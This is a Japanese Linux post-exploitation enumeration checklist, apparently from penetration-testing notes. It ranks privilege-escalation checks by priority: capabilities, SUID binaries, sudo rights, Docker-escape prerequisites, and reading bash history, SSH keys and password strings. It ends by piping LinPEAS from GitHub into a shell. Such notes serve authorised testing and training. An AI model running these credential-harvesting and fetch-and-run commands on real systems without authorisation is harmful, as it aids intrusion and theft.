# Linux 侵入後 列挙チェックリスト

シェルを取得したら、権限昇格の糸口を探すために以下を順番に確認する。
**優先度「高」を全て確認してから「中」「低」に移る。**

---

## 優先度：高

### 現在のユーザーと権限
```bash
id
whoami
groups
```

### Linux Capabilities（最重要）
```bash
getcap -r / 2>/dev/null
```

**着眼点：** 以下の Capabilities が設定されたバイナリがあれば権限昇格の可能性が高い。

| Capability | 危険な理由 |
|-----------|-----------|
| `cap_setuid` | setuid(0) で root に変身できる |
| `cap_setgid` | setgid(0) で root グループに入れる |
| `cap_net_raw` | パケットキャプチャが可能 |
| `cap_sys_ptrace` | プロセスへのデバッガアタッチ |
| `cap_dac_override` | ファイルのパーミッションを無視して読み書き |

→ 詳細: `Capabilities.md`

### SUID / SGID バイナリ
```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
```

**着眼点：** 標準バイナリ（`find`, `vim`, `python`, `perl`, `bash`等）に SUID が設定されていれば GTFOBins で悪用方法を確認する。

→ 詳細: `SUID_SGID.md`

### sudo 権限
```bash
sudo -l
```

**着眼点：** `NOPASSWD` で実行できるコマンドがあれば GTFOBins で確認する。

→ 詳細: `Sudo_Misconfig.md`

---

## 優先度：中

### 実行中プロセス（rootが実行しているプロセスに注目）
```bash
ps aux
ps aux | grep root
```

### ネットワーク接続（内部サービスの確認）
```bash
ss -tlnp
netstat -tlnp 2>/dev/null
```

**着眼点：** `127.0.0.1` にバインドされているサービス（外部から見えないサービス）は、内部からアクセスできる可能性がある。

### Dockerコンテナ環境かどうかの確認

シェルを取得したら早期に「自分がコンテナ内にいるか」を確認する。コンテナ内にいる場合、ホストへの脱出経路を探す必要がある。

```bash
# 方法1: /etc/hosts でホスト名と IP を確認
cat /etc/hosts
# ホスト名がランダムな16進文字列 かつ IPが 172.17.0.x → Docker コンテナ
# 例: 172.17.0.2   e6ff5b1cbc85

# 方法2: 自分の IP アドレスを確認
ip addr show
hostname -I
# 172.17.0.x であればDockerデフォルトブリッジネットワーク上にいる

# 方法3: /.dockerenv の存在を確認
ls /.dockerenv 2>/dev/null && echo "コンテナ内"

# 方法4: cgroup の確認
cat /proc/1/cgroup | grep -i docker
```

**コンテナ内と判断したら確認すること：**

```bash
# ブロックデバイスが見えるか（ホスト breakout の前提条件）
ls /dev/sd* /dev/vd* 2>/dev/null

# マウント状況の確認
cat /proc/mounts

# 実行中コンテナの特権モードの確認（privileged だと breakout が容易）
cat /proc/self/status | grep -i "capeff\|capbnd"
# CapEff や CapBnd が 0000003fffffffff（全権限）なら privileged コンテナ
```

**コンテナIDはホストへの sudo docker exec 悪用時に必要：**
`/etc/hosts` のホスト名（例: `e6ff5b1cbc85`）がコンテナIDとして使える。

→ sudo docker exec の悪用: `Sudo_Misconfig.md`（パターン4）
→ IPレンジと環境の対応: `../01_Reconnaissance/Network_Scanning.md`（IPアドレスレンジから環境を読む）

### 環境変数
```bash
env
cat /proc/1/environ 2>/dev/null | tr '\0' '\n'
```

### ホームディレクトリの確認
```bash
ls -la /home/
ls -la ~/
cat ~/.bash_history
cat ~/.ssh/
```

**着眼点：**
- `.bash_history` に平文パスワードが残っていることがある
- `.ssh/id_rsa` がある場合は他ホストへのSSH接続に使える

### 設定ファイル・パスワードファイルの探索
```bash
find / -name "*.conf" -o -name "*.config" -o -name "config.php" 2>/dev/null | head -20
grep -r "password\|passwd\|secret" /etc/ 2>/dev/null | grep -v "Binary" | head -20
```

---

## 優先度：低

### Crontab（定期実行タスク）
```bash
crontab -l
cat /etc/cron*
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null
```

**着眼点：** root が実行しているスクリプトが書き込み可能であれば権限昇格できる。

### 書き込み可能なディレクトリ・ファイル
```bash
# 書き込み可能なディレクトリ
find / -writable -type d 2>/dev/null | grep -v "proc\|sys\|dev\|run"

# /etc 配下の書き込み可能なファイル
find /etc -writable -type f 2>/dev/null
```

### OS・カーネルバージョン（カーネルエクスプロイトの確認）
```bash
uname -a
cat /etc/os-release
```

**着眼点：** 古いカーネルバージョンは既知のローカル権限昇格エクスプロイト（DirtyPipe, DirtyCOW等）が存在する。

### インストール済みパッケージ・バージョン
```bash
dpkg -l 2>/dev/null | head -50
rpm -qa 2>/dev/null | head -50
```

---

## 自動列挙ツール

手動確認後、より広範な調査に使う：

```bash
# LinPEAS（最も網羅的）
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# linux-smart-enumeration
./lse.sh -l 1
```

---

## 関連技術
- Capabilities 発見 → `Capabilities.md`
- SUID 発見 → `SUID_SGID.md`
- sudo 権限 → `Sudo_Misconfig.md`
